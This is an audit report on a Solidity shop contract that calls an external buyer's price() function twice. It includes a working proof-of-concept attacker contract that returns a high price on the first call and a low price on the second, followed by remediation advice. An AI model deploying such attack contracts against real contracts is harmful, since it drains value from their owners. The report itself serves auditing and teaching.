# Smart Contract Audit Report

## Title (Vulnerability Type)
Logic Manipulation via External View Function (State-Dependent Return Values)

### Severity
Critical

### Category
* Business Logic Vulnerability
* Trusting External Contract Input
* Inconsistent State Read (TOCTOU-style issue)

---

## Summary
The Shop contract relies on an external contract (IBuyer) to provide a price via a view function. However, the contract calls this function twice within the same transaction, assuming consistent results.

An attacker can exploit this by returning:
* A high value during the first call (to pass the check)
* A low value during the second call (to set a lower price)

This allows purchasing the item for less than the intended price, violating core business logic.

---

## Intended Functionality
The shop sets an initial price of 100. A buyer should only be able to purchase if:
* buyer.price() >= price

**After purchase:**
* isSold becomes true
* price updates to the buyer’s offered price

**Expected:** Item should not be sold below the initial price.

---

## Root Cause
```solidity
if (_buyer.price() >= price && !isSold) {
    isSold = true;
    price = _buyer.price();
}
```

**Issues:**
1. **Multiple External Calls:** _buyer.price() is called twice.
2. **State Change Between Calls:** isSold is updated between the two calls.
3. **Trusting External View Function:** Assumes price() returns a consistent value and does not enforce immutability or caching.

This creates a **Time-of-Check vs Time-of-Use (TOCTOU)** vulnerability.

---

## Impact
* Item can be purchased for arbitrarily low price
* Economic logic is broken
* Contract trust assumptions are violated
* External contracts can manipulate core logic

---

## Proof of Concept

### Malicious Buyer Contract:
```solidity
contract AttackBuyer {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100; // pass condition
        } else {
            return 1;   // set low price
        }
    }
}
```

### Execution Flow:
1. buy() is called.
2. **First call** -> price() returns 100.
3. Condition passes.
4. isSold = true.
5. **Second call** -> price() returns 1.
6. Price updated to 1.

**Final result:**
* Item sold
* Price becomes 1

---

## Why This is Critical
* Breaks core economic invariant
* Exploitable by any external contract
* No access control required
* Very hard to detect without deep understanding
* Demonstrates unsafe reliance on:
    * External contracts
    * view function assumptions

**This is a classic real-world audit finding pattern**

---

## Recommended Remediations

### 1. Cache External Call Result
```solidity
uint256 offeredPrice = _buyer.price();

if (offeredPrice >= price && !isSold) {
    isSold = true;
    price = offeredPrice;
}
```
**Ensures consistency**

### 2. Avoid Multiple External Calls
Never call untrusted external contracts multiple times in critical logic.

### 3. Do Not Trust External View Functions
Treat them as untrusted input. Assume they can return different values per call.

### 4. Apply Checks-Effects-Interactions Pattern
Perform checks, update state, and then interact externally (if needed).

### 5. Use Internal Pricing Logic
Avoid delegating pricing decisions to external contracts.